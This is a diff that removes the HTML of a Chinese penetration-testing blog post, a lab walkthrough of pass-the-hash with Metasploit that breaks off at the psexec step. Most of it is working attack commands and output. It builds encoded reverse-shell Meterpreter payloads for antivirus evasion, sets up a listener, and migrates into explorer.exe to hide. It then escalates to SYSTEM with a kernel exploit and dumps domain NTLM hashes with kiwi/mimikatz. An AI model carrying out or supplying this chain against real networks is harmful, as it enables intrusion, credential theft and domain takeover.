@@ -1,749 +1,473 @@
-<!DOCTYPE html>
-<html lang="en">
-  <head>
-  <meta charset="utf-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1" />
-  <meta name="description" content="我的个人博客，主要用于记录自己的一些渗透测试、编程等学习笔记之类的东西。"/>
-  <meta name="author" content="Reber"/>
-  
-    
-      <title>使用 MSF 进行 PtH 和 PtT | Reber&#39;s Blog</title>
-    
-  
-  <link rel="stylesheet" href="/css/reset.css"/>
-  
-  <link rel="stylesheet" href="/css/smigle.css"/>
-  
-    <link rel="stylesheet" href="/css/monokai-sublime.min.css"/>
-  
-    <link rel="stylesheet" href="/css/style.css"/>
-  
-  
-    <script src="/js/jquery-3.6.0.min.js"/></script>
-  
-    <script src="/js/highlight.min.js"/></script>
-  
-    <script src="/js/style.js"/></script>
-  
-  <link rel="icon" type="image/img" sizes="16x16" href="/img/logo.png">
-  <meta name="msapplication-TileColor" content="#da532c">
-  <meta name="theme-color" content="#ffffff">
-</head>
-
-  <body>
-    <header>
-  <div id="brand">
-    <a class="icon-link" href="https://wyb0.com/">
-      <img
-        class="icon"
-        src="/img/logo.png"
-      />
-    </a>
-    <div class="text">
-      <a href="https://wyb0.com/"><h1>Reber&#39;s Blog</h1></a>
-      <h3>只会一点点编程、只会一点点渗透</h3>
-    </div>
-  </div>
-  <nav>
-    
-      
-        
-        <a href="/"><b>Home</b></a>
-      
-         | 
-        <a href="/posts/"><b>Posts</b></a>
-      
-         | 
-        <a href="/categories/"><b>Categories</b></a>
-      
-         | 
-        <a href="/tags/"><b>Tags</b></a>
-      
-         | 
-        <a href="/about/"><b>About</b></a>
-      
-         | 
-        <a href="/friends/"><b>Friends</b></a>
-      
-    
-  </nav>
-  <hr />
-</header>
-
-    <div id="content">
-      
-  <main>
-    <article>
-      <h1>使用 MSF 进行 PtH 和 PtT</h1>
-      
-<div class="post-meta">
-    <time>2023-03-25</time>
-    
-    [<a href="/categories/Pentest">Pentest</a>](<a href="/tags/intranet">intranet</a>)
-</div>
-
-      <div><h3 id="0x00-概述">0x00 概述</h3>
-<ul>
-<li>
-<p>环境</p>
-<p>攻击机 MSF：172.20.10.2<br>
-DC (Server2008R2X64)：10.11.11.5<br>
-目标机 (Win7ProX86)：10.11.11.14</p>
-</li>
-<li>
-<p>PtH 和 PtT</p>
-<p>PtH 一般用来进行域内横向<br>
-PtT 一般是在已经获取域控的前提下利用，用来做权限维持</p>
-</li>
-</ul>
-<h3 id="0x01-前期准备">0x01 前期准备</h3>
-<ul>
-<li>
-<p>生成 payload</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>msfvenom -p windows/meterpreter/reverse_tcp LHOST<span style="color:#f92672">=</span>172.20.10.2 LPORT<span style="color:#f92672">=</span><span style="color:#ae81ff">4444</span> -b <span style="color:#e6db74">&#39;\x00\x0a\xff&#39;</span> --platform windows -a x86  -e x86/shikata_ga_nai -i <span style="color:#ae81ff">5</span>  -f exe -o 86.exe
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST<span style="color:#f92672">=</span>172.20.10.2 LPORT<span style="color:#f92672">=</span><span style="color:#ae81ff">4444</span> -b <span style="color:#e6db74">&#39;\x00&#39;</span> --platform windows -a x64  -e x64/xor -i <span style="color:#ae81ff">5</span>  -f exe -o 64.exe
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#75715e"># -p 指定 payload (用 msfvenom -l payloads 可查看所有 payload)</span>
-</span></span><span style="display:flex;"><span><span style="color:#75715e"># -a 指定目标指令集架构</span>
-</span></span><span style="display:flex;"><span><span style="color:#75715e"># -e 指定用什么编码器编码(多次编码变幻可以免杀，用 msfvenom -l encoders 可查看编码类型)</span>
-</span></span><span style="display:flex;"><span><span style="color:#75715e"># -i 指定编码迭代的次数</span>
-</span></span><span style="display:flex;"><span><span style="color:#75715e"># --platform 执行目标的平台</span>
-</span></span><span style="display:flex;"><span><span style="color:#75715e"># -f 指定输出格式，可用 msfvenom --help-formats查看</span>
-</span></span></code></pre></div></li>
-<li>
-<p>配置监听</p>
-<p>ExitOnSession 在接收到 seesion 后继续监听端口，防止假死与假 session<br>
-SessionCommunicationTimeout 默认情况下，会话在 5 分钟没有任何活动会被杀死，可将此项修改为 0<br>
-SessionExpirationTimeout 默认情况下，一个星期后，会话将被强制关闭，修改为0可永久不会被关闭<br>
-EnableStageEncoding 用来设置二级有效负载是否进行编码<br>
-StageEncoder 指定编码器类型<br>
-StageEncoder 指定的编码器对有效负载编码时失败后，是否回退到默认编码器（例如 x86/shikata_ga_nai）。如果将 set StageEncodingFallback 设置为 false，则在编码失败时将不会回退到默认编码器。这可以帮助确保有效负载编码的一致性和可靠性。<br>
-exploit -j -z -j 为后台任务，-z 为成功后不主动发送 stage</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>msf &gt; use exploit/multi/handler
-</span></span><span style="display:flex;"><span>msf exploit<span style="color:#f92672">(</span>multi/handler<span style="color:#f92672">)</span> &gt; set PAYLOAD windows/meterpreter/reverse_tcp
-</span></span><span style="display:flex;"><span>msf exploit<span style="color:#f92672">(</span>multi/handler<span style="color:#f92672">)</span> &gt; set LHOST 0.0.0.0
-</span></span><span style="display:flex;"><span>msf exploit<span style="color:#f92672">(</span>multi/handler<span style="color:#f92672">)</span> &gt; set LPORT <span style="color:#ae81ff">4444</span>
-</span></span><span style="display:flex;"><span>msf exploit<span style="color:#f92672">(</span>multi/handler<span style="color:#f92672">)</span> &gt; set ExitOnSession false
-</span></span><span style="display:flex;"><span>msf exploit<span style="color:#f92672">(</span>multi/handler<span style="color:#f92672">)</span> &gt; set SessionCommunicationTimeout <span style="color:#ae81ff">36000</span>
-</span></span><span style="display:flex;"><span>msf exploit<span style="color:#f92672">(</span>multi/handler<span style="color:#f92672">)</span> &gt; set SessionExpirationTimeout <span style="color:#ae81ff">36000</span>
-</span></span><span style="display:flex;"><span>// msf exploit<span style="color:#f92672">(</span>multi/handler<span style="color:#f92672">)</span> &gt; set EnableStageEncoding true
-</span></span><span style="display:flex;"><span>// msf exploit<span style="color:#f92672">(</span>multi/handler<span style="color:#f92672">)</span> &gt; set StageEncoder x64/xor
-</span></span><span style="display:flex;"><span>// msf exploit<span style="color:#f92672">(</span>multi/handler<span style="color:#f92672">)</span> &gt; set StageEncodingFallback false
-</span></span><span style="display:flex;"><span>msf exploit<span style="color:#f92672">(</span>multi/handler<span style="color:#f92672">)</span> &gt; exploit -j -z
-</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Exploit running as background job 0.
-</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Started reverse TCP handler on 0.0.0.0:4444
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>msf exploit<span style="color:#f92672">(</span>multi/handler<span style="color:#f92672">)</span> &gt; jobs
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>Jobs
-</span></span><span style="display:flex;"><span><span style="color:#f92672">====</span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>Id  Name                    Payload                          Payload opts
-</span></span><span style="display:flex;"><span>--  ----                    -------                          ------------
-</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0</span>   Exploit: multi/handler  windows/meterpreter/reverse_tcp  tcp://0.0.0.0:4444
-</span></span></code></pre></div></li>
-</ul>
-<h3 id="0x02-目标机反弹-shell">0x02 目标机反弹 shell</h3>
-<ul>
-<li>
-<p>在目标主机上执行生成的 payload：86.exe，收到 shell</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>msf6 exploit<span style="color:#f92672">(</span>multi/handler<span style="color:#f92672">)</span> &gt;
-</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Sending stage <span style="color:#f92672">(</span><span style="color:#ae81ff">175686</span> bytes<span style="color:#f92672">)</span> to 172.20.10.2
-</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Meterpreter session <span style="color:#ae81ff">1</span> opened <span style="color:#f92672">(</span>172.20.10.2:4444 -&gt; 172.20.10.2:60181<span style="color:#f92672">)</span> at 2023-03-06 12:31:17 +0800
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>msf6 exploit<span style="color:#f92672">(</span>multi/handler<span style="color:#f92672">)</span> &gt; sessions
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>Active sessions
-</span></span><span style="display:flex;"><span><span style="color:#f92672">===============</span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>Id  Name  Type                     Information              Connection
-</span></span><span style="display:flex;"><span>--  ----  ----                     -----------              ----------
-</span></span><span style="display:flex;"><span><span style="color:#ae81ff">1</span>         meterpreter x86/windows  TEST<span style="color:#ae81ff">\z</span>hangsan @ WIN7PRO  172.20.10.2:4444 -&gt; 172.20.10.14:60997 <span style="color:#f92672">(</span>172.20.10.14<span style="color:#f92672">)</span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>msf6 exploit<span style="color:#f92672">(</span>multi/handler<span style="color:#f92672">)</span> &gt; sessions <span style="color:#ae81ff">1</span>
-</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Starting interaction with 1...
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>meterpreter &gt; getuid
-</span></span><span style="display:flex;"><span>Server username: TEST<span style="color:#ae81ff">\z</span>hangsan
-</span></span></code></pre></div></li>
-<li>
-<p>进程迁移</p>
-<p>将进程迁移到了资源管理器，防止目标通过任务管理器或者使用 tasklist 看到我们的进程。<br>
-一般注入 svchost.exe、explorer.exe、lsass.exe、services.exe、winlogon.exe、rundll32.exe、taskhost.exe、spoolsv.exe</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>meterpreter &gt; ps
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>Process List
-</span></span><span style="display:flex;"><span><span style="color:#f92672">============</span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>PID   PPID  Name               Arch  Session  User           Path
-</span></span><span style="display:flex;"><span>---   ----  ----               ----  -------  ----           ----
-</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0</span>     <span style="color:#ae81ff">0</span>     <span style="color:#f92672">[</span>System Process<span style="color:#f92672">]</span>
-</span></span><span style="display:flex;"><span><span style="color:#ae81ff">4</span>     <span style="color:#ae81ff">0</span>     System
-</span></span><span style="display:flex;"><span><span style="color:#ae81ff">272</span>   <span style="color:#ae81ff">4</span>     smss.exe
-</span></span><span style="display:flex;"><span><span style="color:#ae81ff">444</span>   <span style="color:#ae81ff">384</span>   winlogon.exe
-</span></span><span style="display:flex;"><span><span style="color:#ae81ff">504</span>   <span style="color:#ae81ff">396</span>   lsass.exe
-</span></span><span style="display:flex;"><span><span style="color:#ae81ff">692</span>   <span style="color:#ae81ff">832</span>   dwm.exe            x86   <span style="color:#ae81ff">1</span>        TEST<span style="color:#ae81ff">\z</span>hangsan  C:<span style="color:#ae81ff">\W</span>indows<span style="color:#ae81ff">\s</span>ystem32<span style="color:#ae81ff">\D</span>wm.exe
-</span></span><span style="display:flex;"><span><span style="color:#ae81ff">808</span>   <span style="color:#ae81ff">1272</span>  explorer.exe       x86   <span style="color:#ae81ff">1</span>        TEST<span style="color:#ae81ff">\z</span>hangsan  C:<span style="color:#ae81ff">\W</span>indows<span style="color:#ae81ff">\E</span>xplorer.EXE
-</span></span><span style="display:flex;"><span><span style="color:#ae81ff">1548</span>  <span style="color:#ae81ff">488</span>   kms-server.exe
-</span></span><span style="display:flex;"><span><span style="color:#ae81ff">1964</span>  <span style="color:#ae81ff">488</span>   taskhost.exe       x86   <span style="color:#ae81ff">1</span>        TEST<span style="color:#ae81ff">\z</span>hangsan  C:<span style="color:#ae81ff">\W</span>indows<span style="color:#ae81ff">\s</span>ystem32<span style="color:#ae81ff">\t</span>askhost.exe
-</span></span><span style="display:flex;"><span><span style="color:#ae81ff">2072</span>  <span style="color:#ae81ff">2748</span>  msiexec.exe        x86   <span style="color:#ae81ff">1</span>                       C:<span style="color:#ae81ff">\W</span>indows<span style="color:#ae81ff">\S</span>ystem32<span style="color:#ae81ff">\m</span>siexec.exe
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>meterpreter &gt; migrate <span style="color:#ae81ff">808</span>
-</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Migrating from <span style="color:#ae81ff">2748</span> to 808...
-</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Migration completed successfully.
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>meterpreter &gt; background
-</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Backgrounding session 1...
-</span></span></code></pre></div></li>
-<li>
-<p>进行提权</p>
-<p>通过 local_exploit_suggester 获取 msf 建议的 exploit</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>msf6 exploit<span style="color:#f92672">(</span>multi/handler<span style="color:#f92672">)</span> &gt; run post/multi/recon/local_exploit_suggester
-</span></span><span style="display:flex;"><span>msf6 post<span style="color:#f92672">(</span>multi/recon/local_exploit_suggester<span style="color:#f92672">)</span> &gt; set session <span style="color:#ae81ff">1</span>
-</span></span><span style="display:flex;"><span>msf6 post<span style="color:#f92672">(</span>multi/recon/local_exploit_suggester<span style="color:#f92672">)</span> &gt; run
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> 172.20.10.2 - Collecting local exploits <span style="color:#66d9ef">for</span> x86/windows...
-</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> 172.20.10.2 - <span style="color:#ae81ff">168</span> exploit checks are being tried...
-</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> 172.20.10.2 - exploit/windows/local/bypassuac_eventvwr: The target appears to be vulnerable.
-</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> 172.20.10.2 - exploit/windows/local/ms10_015_kitrap0d: The service is running, but could not be validated.
-</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> 172.20.10.2 - exploit/windows/local/ms15_004_tswbproxy: The service is running, but could not be validated.
-</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> 172.20.10.2 - exploit/windows/local/ms15_051_client_copy_image: The target appears to be vulnerable.
-</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Running check method <span style="color:#66d9ef">for</span> exploit <span style="color:#ae81ff">41</span> / <span style="color:#ae81ff">41</span>
-</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> 172.20.10.2 - Valid modules <span style="color:#66d9ef">for</span> session 3:
-</span></span><span style="display:flex;"><span><span style="color:#f92672">============================</span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#75715e">#   Name                                                           Potentially Vulnerable?  Check Result</span>
-</span></span><span style="display:flex;"><span>-   ----                                                           -----------------------  ------------
-</span></span><span style="display:flex;"><span><span style="color:#ae81ff">1</span>   exploit/windows/local/bypassuac_eventvwr                       Yes                      The target appears to be vulnerable.
-</span></span><span style="display:flex;"><span><span style="color:#ae81ff">2</span>   exploit/windows/local/ms10_015_kitrap0d                        Yes                      The service is running, but could not be validated.
-</span></span><span style="display:flex;"><span><span style="color:#ae81ff">3</span>   exploit/windows/local/ms15_004_tswbproxy                       Yes                      The service is running, but could not be validated.
-</span></span><span style="display:flex;"><span><span style="color:#ae81ff">4</span>   exploit/windows/local/ms15_051_client_copy_image               Yes                      The target appears to be vulnerable.
-</span></span><span style="display:flex;"><span><span style="color:#ae81ff">5</span>   exploit/windows/local/bthpan                                    No                       The target is not exploitable.
-</span></span><span style="display:flex;"><span>。。。。
-</span></span><span style="display:flex;"><span>。。。。
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Post module execution completed
-</span></span></code></pre></div><p>利用 msf 建议的 exploit 进行提权</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>msf6 post<span style="color:#f92672">(</span>multi/recon/local_exploit_suggester<span style="color:#f92672">)</span> &gt; use exploit/windows/local/ms10_015_kitrap0d
-</span></span><span style="display:flex;"><span>msf6 exploit<span style="color:#f92672">(</span>exploit/windows/local/ms10_015_kitrap0d<span style="color:#f92672">)</span> &gt; set session <span style="color:#ae81ff">1</span>
-</span></span><span style="display:flex;"><span>msf6 exploit<span style="color:#f92672">(</span>windows/local/ms10_015_kitrap0d<span style="color:#f92672">)</span> &gt; run
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Started reverse TCP handler on 172.20.10.2:4444
-</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Reflectively injecting payload and triggering the bug...
-</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Launching msiexec to host the DLL...
-</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Process <span style="color:#ae81ff">2072</span> launched.
-</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Reflectively injecting the DLL into 2072...
-</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Exploit finished, wait <span style="color:#66d9ef">for</span> <span style="color:#f92672">(</span>hopefully privileged<span style="color:#f92672">)</span> payload execution to complete.
-</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Sending stage <span style="color:#f92672">(</span><span style="color:#ae81ff">175686</span> bytes<span style="color:#f92672">)</span> to 172.20.10.2
-</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Meterpreter session <span style="color:#ae81ff">2</span> opened <span style="color:#f92672">(</span>172.20.10.2:4444 -&gt; 172.20.10.14:61686<span style="color:#f92672">)</span> at 2023-03-06 12:40:02 +0800
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>meterpreter &gt; getuid
-</span></span><span style="display:flex;"><span>Server username: NT AUTHORITY<span style="color:#ae81ff">\S</span>YSTEM
-</span></span><span style="display:flex;"><span>meterpreter &gt; shell
-</span></span><span style="display:flex;"><span>Process <span style="color:#ae81ff">680</span> created.
-</span></span><span style="display:flex;"><span>Channel <span style="color:#ae81ff">2</span> created.
-</span></span><span style="display:flex;"><span>Microsoft Windows <span style="color:#f92672">[</span>�汾 6.1.7600<span style="color:#f92672">]</span>
-</span></span><span style="display:flex;"><span>��Ȩ���� <span style="color:#f92672">(</span>c<span style="color:#f92672">)</span> <span style="color:#ae81ff">2009</span> Microsoft Corporation����������Ȩ��
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\z</span>hangsan<span style="color:#ae81ff">\D</span>esktop&gt;chcp <span style="color:#ae81ff">65001</span>
-</span></span><span style="display:flex;"><span>chcp <span style="color:#ae81ff">65001</span>
-</span></span><span style="display:flex;"><span>Active code page: <span style="color:#ae81ff">65001</span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\z</span>hangsan<span style="color:#ae81ff">\D</span>esktop&gt;net group <span style="color:#e6db74">&#34;domain admins&#34;</span> /domain
-</span></span><span style="display:flex;"><span>net group <span style="color:#e6db74">&#34;domain admins&#34;</span> /domain
-</span></span><span style="display:flex;"><span>The request will be processed at a domain controller <span style="color:#66d9ef">for</span> domain test.com.
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>Group name     Domain Admins
-</span></span><span style="display:flex;"><span>Comment        ָ���������Ա
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>Members
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>-------------------------------------------------------------------------------
-</span></span><span style="display:flex;"><span>admin                    Administrator
-</span></span><span style="display:flex;"><span>The command completed successfully.
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\z</span>hangsan<span style="color:#ae81ff">\D</span>esktop&gt;exit
-</span></span><span style="display:flex;"><span>exit
-</span></span><span style="display:flex;"><span>meterpreter &gt; background
-</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Backgrounding session 2...
-</span></span><span style="display:flex;"><span>msf6 exploit<span style="color:#f92672">(</span>windows/local/ms10_015_kitrap0d<span style="color:#f92672">)</span> &gt; sessions
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>Active sessions
-</span></span><span style="display:flex;"><span><span style="color:#f92672">===============</span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>Id  Name  Type                     Information                    Connection
-</span></span><span style="display:flex;"><span>--  ----  ----                     -----------                    ----------
-</span></span><span style="display:flex;"><span><span style="color:#ae81ff">1</span>         meterpreter x86/windows  TEST<span style="color:#ae81ff">\z</span>hangsan @ WIN7PRO        172.20.10.2:4444 -&gt; 172.20.10.14:60181 <span style="color:#f92672">(</span>172.20.10.14<span style="color:#f92672">)</span>
-</span></span><span style="display:flex;"><span><span style="color:#ae81ff">2</span>         meterpreter x86/windows  NT AUTHORITY<span style="color:#ae81ff">\S</span>YSTEM @ WIN7PRO  172.20.10.2:4444 -&gt; 172.20.10.14:61686 <span style="color:#f92672">(</span>172.20.10.14<span style="color:#f92672">)</span>
-</span></span></code></pre></div></li>
-</ul>
-<h3 id="0x03-进行-hash-传递攻击pth">0x03 进行 Hash 传递攻击(PtH)</h3>
-<ul>
-<li>
-<p>首先通过域内用户 SYSTEM 权限得到 ntlm hash</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>msf6 exploit<span style="color:#f92672">(</span>windows/local/ms10_015_kitrap0d<span style="color:#f92672">)</span> &gt; sessions <span style="color:#ae81ff">2</span>
-</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Starting interaction with 2...
-</span></span><span style="display:flex;"><span>meterpreter &gt; load kiwi
-</span></span><span style="display:flex;"><span>meterpreter &gt; kiwi_cmd sekurlsa::logonpasswords
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>Authentication Id : <span style="color:#ae81ff">0</span> ; <span style="color:#ae81ff">405357</span> <span style="color:#f92672">(</span>00000000:00062f6d<span style="color:#f92672">)</span>
-</span></span><span style="display:flex;"><span>Session           : CachedInteractive from <span style="color:#ae81ff">1</span>
-</span></span><span style="display:flex;"><span>User Name         : Administrator
-</span></span><span style="display:flex;"><span>Domain            : TEST
-</span></span><span style="display:flex;"><span>Logon Server      : WIN-2008
-</span></span><span style="display:flex;"><span>Logon Time        : 2023/3/5 21:06:10
-</span></span><span style="display:flex;"><span>SID               : S-1-5-21-3160176211-3702513722-812664031-500
-</span></span><span style="display:flex;"><span>    msv :
-</span></span><span style="display:flex;"><span>    <span style="color:#f92672">[</span>00000003<span style="color:#f92672">]</span> Primary
-</span></span><span style="display:flex;"><span>    * Username : Administrator
-</span></span><span style="display:flex;"><span>    * Domain   : TEST
-</span></span><span style="display:flex;"><span>    * LM       : f26fb3ae03e93ab913328873c0db4945
-</span></span><span style="display:flex;"><span>    * NTLM     : 0e032b9d51a580ac6cdfabad8bc97a38
-</span></span><span style="display:flex;"><span>    * SHA1     : c17a16040770e68ea65ce528b5f503dba3663d16
-</span></span><span style="display:flex;"><span>    ......
-</span></span><span style="display:flex;"><span>    ......
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>Authentication Id : <span style="color:#ae81ff">0</span> ; <span style="color:#ae81ff">136194</span> <span style="color:#f92672">(</span>00000000:00021402<span style="color:#f92672">)</span>
-</span></span><span style="display:flex;"><span>Session           : Interactive from <span style="color:#ae81ff">1</span>
-</span></span><span style="display:flex;"><span>User Name         : zhangsan
-</span></span><span style="display:flex;"><span>Domain            : TEST
-</span></span><span style="display:flex;"><span>Logon Server      : WIN-2008
-</span></span><span style="display:flex;"><span>Logon Time        : 2023/3/5 20:31:02
-</span></span><span style="display:flex;"><span>SID               : S-1-5-21-3160176211-3702513722-812664031-1118
-</span></span><span style="display:flex;"><span>    msv :
-</span></span><span style="display:flex;"><span>    <span style="color:#f92672">[</span>00000003<span style="color:#f92672">]</span> Primary
-</span></span><span style="display:flex;"><span>    * Username : zhangsan
-</span></span><span style="display:flex;"><span>    * Domain   : TEST
-</span></span><span style="display:flex;"><span>    * LM       : 1c27b75762feeeb3e72c57ef50f76a05
-</span></span><span style="display:flex;"><span>    * NTLM     : 993ca38cf7795d31bc429a8b9903a01a
-</span></span><span style="display:flex;"><span>    * SHA1     : 491010a4fb3715098e98c855175c841ac2d1badc
-</span></span><span style="display:flex;"><span>    ......
-</span></span><span style="display:flex;"><span>    ......
-</span></span></code></pre></div><p>查看域内管理员组用户</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>meterpreter &gt; shell
-</span></span><span style="display:flex;"><span>Process <span style="color:#ae81ff">716</span> created.
-</span></span><span style="display:flex;"><span>Channel <span style="color:#ae81ff">3</span> created.
-</span></span><span style="display:flex;"><span>Microsoft Windows <span style="color:#f92672">[</span>�汾 6.1.7600<span style="color:#f92672">]</span>
-</span></span><span style="display:flex;"><span>��Ȩ���� <span style="color:#f92672">(</span>c<span style="color:#f92672">)</span> <span style="color:#ae81ff">2009</span> Microsoft Corporation����������Ȩ��
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\z</span>hangsan<span style="color:#ae81ff">\D</span>esktop&gt;chcp <span style="color:#ae81ff">65001</span>
-</span></span><span style="display:flex;"><span>chcp <span style="color:#ae81ff">65001</span>
-</span></span><span style="display:flex;"><span>Active code page: <span style="color:#ae81ff">65001</span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\z</span>hangsan<span style="color:#ae81ff">\D</span>esktop&gt;net group <span style="color:#e6db74">&#34;domain admins&#34;</span> /domain
-</span></span><span style="display:flex;"><span>net group <span style="color:#e6db74">&#34;domain admins&#34;</span> /domain
-</span></span><span style="display:flex;"><span>The request will be processed at a domain controller <span style="color:#66d9ef">for</span> domain test.com.
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>Members
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>-------------------------------------------------------------------------------
-</span></span><span style="display:flex;"><span>admin                    Administrator
-</span></span><span style="display:flex;"><span>The command completed successfully.
-</span></span><span style="display:flex;"><span>meterpreter &gt; background
-</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Backgrounding session 2...
-</span></span></code></pre></div></li>
-<li>
-<p>进行 pth 获取 DC 的权限</p>
-<p>使用域内管理员组用户的 hash，这里用 admin 这个用户</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>msf6 exploit<span style="color:#f92672">(</span>windows/local/ms10_015_kitrap0d<span style="color:#f92672">)</span> &gt; use exploit/windows/smb/psexec
-</span></span><span style="display:flex;"><span>msf6 exploit<span style="color:#f92672">(</span>windows/smb/psexec<span style="color:#f92672">)</span> &gt; options
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>Module options <span style="color:#f92672">(</span>exploit/windows/smb/psexec<span style="color:#f92672">)</span>:
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>Name                  Current Setting                    Required  Description
-</span></span><span style="display:flex;"><span>----                  ---------------                    --------  -----------
